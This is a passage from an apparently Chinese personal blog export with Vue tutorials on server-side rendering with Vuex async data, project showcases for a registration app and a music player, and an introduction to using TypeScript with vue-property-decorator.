<p>修改home.vue<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;home&quot;&gt;</span><br><span class="line">    &lt;img alt=&quot;Vue logo&quot; src=&quot;../assets/logo.png&quot; @click=&quot;say&quot;&gt;</span><br><span class="line">    &lt;HelloWorld msg=&quot;Welcome to Your Vue.js App&quot;/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// @ is an alias to /src</span><br><span class="line">import HelloWorld from &apos;@/components/HelloWorld.vue&apos;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &apos;home&apos;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    HelloWorld</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    say () &#123;</span><br><span class="line">      alert(this.$store.state.age)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>点击图片弹出state中的数据<br><img src="/images/ssr8.png" alt="My Pic"></p>
</blockquote>
<ol>
<li>添加异步数据<blockquote>
<p>在渲染前，要预先获取所有需要的异步数据，然后存到Vuex的store中。<br>在后端渲染时，通过Vuex将获取到的数据注入到相应组件中。<br>把store中的数据设置到window.<strong>INITIAL_STATE</strong>属性中。<br>在浏览器环境中，通过Vuex将window.<strong>INITIAL_STATE</strong>里面的数据注入到相应组件中。</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>修改entry-server.js<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* entry-server */</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">"./main"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> context =&gt; &#123;</span><br><span class="line">  <span class="comment">// 因为有可能会是异步路由钩子函数或组件，所以我们将返回一个 Promise，</span></span><br><span class="line">  <span class="comment">// 以便服务器能够等待所有的内容在渲染前，</span></span><br><span class="line">  <span class="comment">// 就已经准备就绪。</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; app, router, store &#125; = createApp();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置服务器端 router 的位置</span></span><br><span class="line">    router.push(context.url);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等到 router 将可能的异步组件和钩子函数解析完</span></span><br><span class="line">    router.onReady(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> matchedComponents = router.getMatchedComponents();</span><br><span class="line">      <span class="comment">// 匹配不到的路由，执行 reject 函数，并返回 404</span></span><br><span class="line">      <span class="keyword">if</span> (!matchedComponents.length) &#123;</span><br><span class="line">        <span class="keyword">return</span> reject(&#123;</span><br><span class="line">          code: <span class="number">404</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Promise 应该 resolve 应用程序实例，以便它可以渲染</span></span><br><span class="line">      <span class="built_in">Promise</span>.all(matchedComponents.map( <span class="keyword">async</span> (component) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (component.asyncData) &#123;</span><br><span class="line">          <span class="keyword">await</span> component.asyncData(&#123; store &#125;);</span><br><span class="line">          <span class="built_in">console</span>.log(store.state)</span><br><span class="line">          context.state = store.state;</span><br><span class="line">          <span class="built_in">console</span>.log(context.state)</span><br><span class="line">          <span class="comment">// 返回根组件</span></span><br><span class="line">          resolve(app);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;))</span><br><span class="line">    &#125;, reject);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>修改store.js<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"><span class="keyword">const</span> fetchBar = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      resolve(<span class="number">20</span>);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">createStore</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> store =  <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">      age: <span class="number">12</span>,</span><br><span class="line">      name: <span class="string">'sxy'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">      <span class="string">'SET_AGE'</span>(state, data) &#123;</span><br><span class="line">        state.age = data;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    actions: &#123;</span><br><span class="line">      fetchBar(&#123; commit &#125;) &#123;</span><br><span class="line">        <span class="keyword">return</span> fetchBar().then(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(data)</span><br><span class="line">          commit(<span class="string">'SET_AGE'</span>, data);</span><br><span class="line">        &#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.error(err);</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span> !== <span class="string">'undefined'</span> &amp;&amp; <span class="built_in">window</span>.__INITIAL_STATE__) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'window.__INITIAL_STATE__'</span>, <span class="built_in">window</span>.__INITIAL_STATE__);</span><br><span class="line">    store.replaceState(<span class="built_in">window</span>.__INITIAL_STATE__);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> store;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>修改home.vue<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;home&quot;&gt;</span><br><span class="line">    &lt;img alt=&quot;Vue logo&quot; src=&quot;../assets/logo.png&quot; @click=&quot;say&quot;&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;age&#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt;HelloWorld msg=&quot;Welcome to Your Vue.js App&quot;/&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">// @ is an alias to /src</span><br><span class="line">import HelloWorld from &apos;@/components/HelloWorld.vue&apos;</span><br><span class="line"> const fetchInitialData = async (&#123; store &#125;) =&gt; &#123;</span><br><span class="line">    await store.dispatch(&apos;fetchBar&apos;);</span><br><span class="line">  &#125;;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &apos;home&apos;,</span><br><span class="line">  asyncData: fetchInitialData,</span><br><span class="line">  components: &#123;</span><br><span class="line">    HelloWorld</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    say () &#123;</span><br><span class="line">      alert(this.$store.state.age)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    age () &#123;</span><br><span class="line">      return this.$store.state.age</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>重新打包之后再启动  可以看到隔了一秒之后加载出了异步数据<br><img src="/images/ssr9.png" alt="My Pic"></p>
</blockquote>
]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>ssr</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue全家桶报名审核活动</title>
    <url>/2018/07/23/Vue%E5%85%A8%E5%AE%B6%E6%A1%B6%E6%8A%A5%E5%90%8D%E5%AE%A1%E6%A0%B8%E6%B4%BB%E5%8A%A8/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;上班之后自己写的稍微复杂一点的vue全家桶项目，用户在指定的时间内点击报名，判断用户是否有资格。有资格则填写一些基本的信息，否则只能分享给有资格的人报名。报名之后进入审核页。审核通过之后进入倒计时页面。报名结束之后进入排行页，用户可以看见自己团队的排名，并且可以点赞，搜索指定团队。比赛完成之后，可以查看自己的获奖情况，以及总共的获奖。<br><a id="more"></a><br>下面是一些页面的截图<br><br>github地址<a href="https://github.com/songxuy/v-runtogether.git" target="_blank" rel="noopener">V-runtogether</a><br><img src="/images/10.jpg" alt="My Pic"><br><img src="/images/2.jpg" alt="My Pic"><br><img src="/images/3.jpg" alt="My Pic"><br><img src="/images/4.jpg" alt="My Pic"><br><img src="/images/5.jpg" alt="My Pic"><br><img src="/images/6.jpg" alt="My Pic"><br><img src="/images/7.jpg" alt="My Pic"><br><img src="/images/8.jpg" alt="My Pic"><br><img src="/images/9.jpg" alt="My Pic"></p>
]]></content>
      <categories>
        <category>vue.js</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue全家桶认证活动</title>
    <url>/2018/06/17/Vue%E5%85%A8%E5%AE%B6%E6%A1%B6%E8%AE%A4%E8%AF%81%E6%B4%BB%E5%8A%A8/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;上班之后自己参与写的第一个项目，关于一个称号的申请和认证的页面，使用vue全家桶开发，数据就直接调用后台的接口。在这个项目中也学习到了很多之前没注意到的地方。比如vue-router的hash模式和history模式，还vuex的一些模块化使用，还有打包工具的使用。自己要学习的地方还有很多，继续加油吧。下面贴几张项目的图。<br><a id="more"></a></p>
<p><img src="/images/v1.jpg" alt="My Pic"><br><img src="/images/v2.jpg" alt="My Pic"><br><img src="/images/v3.jpg" alt="My Pic"><br><img src="/images/v4.jpg" alt="My Pic"><br><img src="/images/v5.jpg" alt="My Pic"></p>
]]></content>
      <categories>
        <category>vue.js</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue全家桶音乐播放器</title>
    <url>/2018/05/27/Vue%E5%85%A8%E5%AE%B6%E6%A1%B6%E9%9F%B3%E4%B9%90%E6%92%AD%E6%94%BE%E5%99%A8/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;最近写了一个基于Vue全家桶的音乐播放器，实现了从服务器获取歌曲列表，点击进入播放界面。可以播放、暂停、上一首、下一首。所用到的技术有Vue+VueX+vue-router+express。效果图如下所示：<br><a id="more"></a><br><img src="/images/mus.png" alt="My Pic"><br><img src="/images/mus1.png" alt="My Pic"><br>点击播放后 歌词跟着动<br><img src="/images/mus2.png" alt="My Pic"></p>
<h1 id="（一）服务端"><a href="#（一）服务端" class="headerlink" title="（一）服务端"></a>（一）服务端</h1><h2 id="1-目录结构"><a href="#1-目录结构" class="headerlink" title="1.目录结构"></a>1.目录结构</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;通过express应用生成器直接生成的模板，修改app.js中的内容。设置允许不同源可以访问，当路由为某个值时，发送一个对象数组，每一个中包含一首歌的对象。<br><img src="/images/mus3.png" alt="My Pic"></p>
<h2 id="2-应用生成器搭建"><a href="#2-应用生成器搭建" class="headerlink" title="2.应用生成器搭建"></a>2.应用生成器搭建</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//先全局安装express</span><br><span class="line">npm install express-generator -g</span><br><span class="line"></span><br><span class="line">//通过express+项目名 生成项目</span><br><span class="line">express myapp</span><br><span class="line"></span><br><span class="line">//进入项目 安装依赖</span><br><span class="line">cd myapp </span><br><span class="line">npm install</span><br><span class="line"></span><br><span class="line">//启动</span><br><span class="line">npm start</span><br><span class="line"></span><br><span class="line">// http://localhost:3000/ 访问</span><br></pre></td></tr></table></figure>
<h1 id="（二）客户端"><a href="#（二）客户端" class="headerlink" title="（二）客户端"></a>（二）客户端</h1><h2 id="1-安装脚手架"><a href="#1-安装脚手架" class="headerlink" title="1.安装脚手架"></a>1.安装脚手架</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;见我之前的一篇blog中提到过，这里就不赘述了。</p>
<h2 id="2-目录结构"><a href="#2-目录结构" class="headerlink" title="2.目录结构"></a>2.目录结构</h2><p><img src="/images/mus4.png" alt="My Pic"></p>
<p>详细代码在github里  想要参考的朋友可以去看<a href="https://github.com/songxuy/Vue-music" target="_blank" rel="noopener">vue-music</a></p>
]]></content>
      <categories>
        <category>vue.js</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue项目中使用TypeScript</title>
    <url>/2020/01/03/Vue%E9%A1%B9%E7%9B%AE%E4%B8%AD%E4%BD%BF%E7%94%A8TypeScript/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;TypeScript也已经出来了蛮久了，不管是项目组还是各种博客论坛中都能看到大家推荐的身影（用过都说好）。但是自己虽然也跟着教程大概看了一遍，但始终没有踏出第一步，但随着vue3即将发布，其next版本已经改为ts编写，也是时候真正的用起来了。下面就给大家介绍一些Vue中使用ts：<br><a id="more"></a></p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><blockquote>
<p>官网的说明：TypeScript是一个有类型的JavaScript超集，编译成纯JavaScript。任何浏览器。任何主机。任何操作系统。开源的。<br>在我看来的话typescript是一个帮助我们管理各种变量参数的工具，能够大大提高代码的质量、健壮性、和可维护性。ts和js最大的区别就是ts多了类型注解功能, 通过名字中的”type”也能看出语言的重点在”类型”上. 这个类型分为基础类型和高级类型, 高级类型就是通过基础类型组成的自定义类型.</p>
</blockquote>
<h4 id="原始数据类型"><a href="#原始数据类型" class="headerlink" title="原始数据类型"></a>原始数据类型</h4><blockquote>
<p>布尔值、数值、字符串、null、undefined在ts中的使用</p>
</blockquote>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> bool: <span class="built_in">boolean</span> =  <span class="literal">false</span></span><br><span class="line"><span class="keyword">let</span> num: <span class="built_in">number</span> = <span class="number">6</span></span><br><span class="line"><span class="keyword">let</span> str: <span class="built_in">string</span> = <span class="string">'Tom'</span></span><br><span class="line"><span class="comment">// 声明一个 void 类型的变量没有什么用，因为你只能将它赋值为 undefined 和 null</span></span><br><span class="line"><span class="keyword">let</span> unusable: <span class="built_in">void</span> = <span class="literal">undefined</span></span><br><span class="line"><span class="comment">// 与 void 的区别是，undefined 和 null 是所有类型的子类型。也就是说 undefined 类型的变量，可以赋值给 number 类型的变量</span></span><br><span class="line"><span class="keyword">let</span> u: <span class="literal">undefined</span> = <span class="literal">undefined</span>;</span><br><span class="line"><span class="keyword">let</span> n: <span class="literal">null</span> = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<h4 id="Any-任意值"><a href="#Any-任意值" class="headerlink" title="Any(任意值)"></a>Any(任意值)</h4><blockquote>
<p>对于不确定类型的变量我们可以赋值为any，但是尽量少用这个类型，用多了其实就失去了我们使用ts的初衷了。</p>
</blockquote>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myFavoriteNumber: <span class="built_in">any</span> = <span class="string">'seven'</span>;</span><br><span class="line">myFavoriteNumber = <span class="number">7</span>;</span><br><span class="line"><span class="comment">// 在任意值上访问任何属性和方法都是允许的</span></span><br><span class="line"><span class="keyword">let</span> anyThing: <span class="built_in">any</span> = <span class="string">'hello'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(anyThing.myName);</span><br><span class="line"><span class="built_in">console</span>.log(anyThing.myName.firstName);</span><br><span class="line"><span class="comment">// 变量如果在声明的时候，未指定其类型，那么它会被识别为任意值类型</span></span><br><span class="line"><span class="keyword">let</span> something;</span><br><span class="line">something = <span class="string">'seven'</span>;</span><br><span class="line">something = <span class="number">7</span>;</span><br></pre></td></tr></table></figure>
<h4 id="联合类型"><a href="#联合类型" class="headerlink" title="联合类型"></a>联合类型</h4><blockquote>
<p>当变量的取值可以为一种以上的类型时，我们可以使用联合类型</p>
</blockquote>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myFavoriteNumber: <span class="built_in">string</span> | <span class="built_in">number</span>;</span><br><span class="line">myFavoriteNumber = <span class="string">'seven'</span>;</span><br><span class="line">myFavoriteNumber = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当 TypeScript 不确定一个联合类型的变量到底是哪个类型的时候，我们只能访问此联合类型的所有类型里共有的属性或方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getLength</span>(<span class="params">something: <span class="built_in">string</span> | <span class="built_in">number</span></span>): <span class="title">number</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> something.length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// index.ts(2,22): error TS2339: Property 'length' does not exist on type 'string | number'.</span></span><br><span class="line"><span class="comment">// Property 'length' does not exist on type 'number'.</span></span><br></pre></td></tr></table></figure>
<h4 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h4><blockquote>
<p>TypeScript 中的接口是一个非常灵活的概念，除了可用于对类的一部分行为进行抽象以外，也常用于对「对象的形状（Shape）」进行描述。</p>
</blockquote>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里就定义了一个Person接口，描述了类中各个属性的类型。赋值的时候，变量的形状必须和接口的形状保持一致。也可以通过？改为非必须属性</span></span><br><span class="line"><span class="keyword">interface</span> Person &#123;</span><br><span class="line">   name: <span class="built_in">string</span>;</span><br><span class="line">   age: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> tom: Person = &#123;</span><br><span class="line">  name: <span class="string">'Tom'</span>,</span><br><span class="line">  age: <span class="number">25</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>关于TypeScript的介绍就到这了，想了解更多可以点击最后的入门教程链接。接下来我们进入正题，如何在Vue项目中使用TS。</p>
</blockquote>
<h3 id="Vue中使用TS"><a href="#Vue中使用TS" class="headerlink" title="Vue中使用TS"></a>Vue中使用TS</h3><h4 id="通过脚手架安装项目"><a href="#通过脚手架安装项目" class="headerlink" title="通过脚手架安装项目"></a>通过脚手架安装项目</h4><blockquote>
<p>这里直接使用vue-cli安装相应的环境<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vue create vuetspro</span><br></pre></td></tr></table></figure></p>
<p>我选择了这几项</p>
<p><img src="/images/ts1.png" alt="My Pic"><br>然后选择自己需要的配置即可，还可以将本次设置保存用于下次创建项目。确认之后就会开始下载相应的依赖。</p>
</blockquote>
<p><img src="/images/ts2.png" alt="My Pic"></p>
<blockquote>
<p>运行项目</p>
</blockquote>
<p><img src="/images/ts3.png" alt="My Pic"></p>
<h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><blockquote>
<p>整体上和普通vue项目结构差不太多，会有一些额外的文件</p>
</blockquote>
<p><img src="/images/ts4.png" alt="My Pic"></p>
<blockquote>
<p>会看到有两个文件（shims-tsx.d.ts、shims-vue.d.ts）<br>根据它们的名字我们也能大概猜到<br>shims-tsx.d.ts：允许项目中出现tsx结尾的文件（即可以使用jsx编写）<br>shims-vue.d.ts：允许项目中出现vue结尾的文件（即可以使用vue语法编写）</p>
</blockquote>
<ul>
<li>查看HelloWorld.vue<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div <span class="keyword">class</span>=<span class="string">"hello"</span>&gt;</span><br><span class="line">    &lt;h1&gt;&#123;&#123; msg &#125;&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/template&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script lang="ts"&gt;</span></span><br><span class="line"><span class="regexp">import &#123; Component, Prop, Vue &#125; from 'vue-property-decorator';</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">@Component</span></span><br><span class="line"><span class="regexp">export default class HelloWorld extends Vue &#123;</span></span><br><span class="line"><span class="regexp">  @Prop() private msg!: string;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Add <span class="string">"scoped"</span> attribute to limit CSS to <span class="keyword">this</span> component only --&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">h3 &#123;</span><br><span class="line">  margin: <span class="number">40</span>px <span class="number">0</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">ul &#123;</span><br><span class="line">  list-style-<span class="keyword">type</span>: none;</span><br><span class="line">  padding: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">li &#123;</span><br><span class="line">  display: inline-block;</span><br><span class="line">  margin: <span class="number">0</span> <span class="number">10</span>px;</span><br><span class="line">&#125;</span><br><span class="line">a &#123;</span><br><span class="line">  color: #<span class="number">42</span>b983;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/style&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>可以看到关于js部分代码已经有了很大的改变了  下面就来具体讲一下</p>
</blockquote>
<h4 id="写法"><a href="#写法" class="headerlink" title="写法"></a>写法</h4><blockquote>
<p>这里主要介绍的是vue-class-component写法</p>
</blockquote>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component, Vue, Prop &#125; <span class="keyword">from</span> <span class="string">'vue-property-decorator'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> Test <span class="keyword">extends</span> Vue &#123;</span><br><span class="line">  <span class="meta">@Prop</span>(&#123; <span class="keyword">type</span>: <span class="built_in">Object</span> &#125;)</span><br><span class="line">  <span class="keyword">private</span> test: &#123; value: <span class="built_in">string</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>首先我们引入了vue-property-decorator<br>vue-property-decorator 是在 vue-class-component 上增强了更多的结合 Vue 特性的装饰器，新增了这 7 个装饰器</p>
<ul>
<li>@Emit</li>
<li>@Inject</li>
<li>@Model</li>
<li>@Prop</li>
<li>@Provide</li>
<li>@Watch</li>
<li>@Component</li>
</ul>
<p>这里主要介绍我们常用的几个@Prop、@Watch、@Component其他的大家可以参考github <a href="https://github.com/kaorun343/vue-property-decorator" target="_blank" rel="noopener">vue-property-decorator</a></p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Post <span class="keyword">from</span> <span class="string">'@/components/post.vue</span></span><br><span class="line"><span class="string">export default &#123;</span></span><br><span class="line"><span class="string">    components: &#123;</span></span><br><span class="line"><span class="string">        Post</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    props: &#123;</span></span><br><span class="line"><span class="string">      msg: &#123;</span></span><br><span class="line"><span class="string">        type: String</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    data () &#123;</span></span><br><span class="line"><span class="string">        return &#123;</span></span><br><span class="line"><span class="string">            name: '</span>xiaobai<span class="string">'</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    computed: &#123;</span></span><br><span class="line"><span class="string">        myname () &#123;</span></span><br><span class="line"><span class="string">            return '</span>hahahah<span class="string">';</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    watch: &#123;</span></span><br><span class="line"><span class="string">        '</span>msg<span class="string">': &#123;</span></span><br><span class="line"><span class="string">          handler: '</span>onChildChanged<span class="string">',</span></span><br><span class="line"><span class="string">          immediate: false,</span></span><br><span class="line"><span class="string">          deep: false</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    methods: &#123;</span></span><br><span class="line"><span class="string">        onChildChanged(val, oldVal) &#123; &#125;,</span></span><br><span class="line"><span class="string">        getAge () &#123; return '</span><span class="number">123</span><span class="string">' &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    mounted () &#123;</span></span><br><span class="line"><span class="string">        console.log('</span>ok<span class="string">')</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>对应者我们的TS代码如下</p>
</blockquote>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component, Prop, Vue, Watch &#125; <span class="keyword">from</span> <span class="string">'vue-property-decorator'</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">class</span> HelloWorld <span class="keyword">extends</span> Vue &#123;</span><br><span class="line">  <span class="comment">//props</span></span><br><span class="line">  <span class="meta">@Prop</span>() <span class="keyword">private</span> msg!: <span class="built_in">string</span>;</span><br><span class="line">  <span class="meta">@Prop</span>() <span class="keyword">private</span> propA!: <span class="built_in">number</span>;</span><br><span class="line">  <span class="meta">@Prop</span>(<span class="built_in">Number</span>) <span class="keyword">private</span> propB: <span class="built_in">number</span> | <span class="literal">undefined</span>;</span><br><span class="line">  <span class="meta">@Prop</span>(&#123; <span class="keyword">default</span>: <span class="string">'default value'</span> &#125;) <span class="keyword">private</span> propC!: <span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// data</span></span><br><span class="line">  <span class="keyword">private</span> name: <span class="built_in">string</span> = <span class="string">'xiaobai'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// watch</span></span><br><span class="line">  <span class="meta">@Watch</span>(<span class="string">'msg'</span>)</span><br><span class="line">  onChildChanged(val: <span class="built_in">string</span>, oldVal: <span class="built_in">string</span>) &#123; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//computed</span></span><br><span class="line">  <span class="keyword">get</span> myname () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hahahah'</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// methods</span></span><br><span class="line">  <span class="keyword">public</span> getAge () &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'123'</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//生命周期</span></span><br><span class="line">  <span class="keyword">private</span> mounted (): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'ok'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里面有几个我们需要注意的地方<br>@Prop() private msg!: string;中的!表示!前面的这个变量一定不是undefined或者null，!叫非空断言操作符。同时我们也可以赋初值以及设置类型。<br>当我们需要设置watch中参数时可以在装饰器中加入相应的配置<br>@Watch(‘msg’, { immediate: true, deep: true })</p>
</blockquote>
<h4 id="添加全局工具"><a href="#添加全局工具" class="headerlink" title="添加全局工具"></a>添加全局工具</h4><blockquote>
<p>同样的，我们也需要修改main.ts<br>这里我们首先先安装 vue国际化工具VueI18n</p>
<ul>
<li>npm install vue-i18n –save</li>
</ul>
</blockquote>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App.vue'</span>;</span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'./router'</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./store'</span>;</span><br><span class="line"><span class="comment">// 新模块</span></span><br><span class="line"><span class="keyword">import</span> i18n <span class="keyword">from</span> <span class="string">'./i18n'</span>;</span><br><span class="line"></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    router, </span><br><span class="line">    store, </span><br><span class="line">    i18n, <span class="comment">// 新模块</span></span><br><span class="line">    render: <span class="function">(<span class="params">h</span>) =&gt;</span> h(App),</span><br><span class="line">&#125;).$mount(<span class="string">'#app'</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
